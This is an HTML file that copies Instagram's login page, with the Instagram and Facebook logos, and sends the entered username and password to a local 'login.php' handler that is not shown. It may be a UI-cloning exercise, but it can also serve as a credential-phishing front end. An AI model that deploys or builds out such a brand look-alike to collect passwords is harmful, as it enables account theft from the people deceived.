<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <h1>Instagram</h1>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">
            <hr><span>OR</span><hr>
        </div>
        <div class="social-login">
            <button class="fb-login">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
                Log in with Facebook
            </button>
        </div>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>
    <div class="signup-container">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
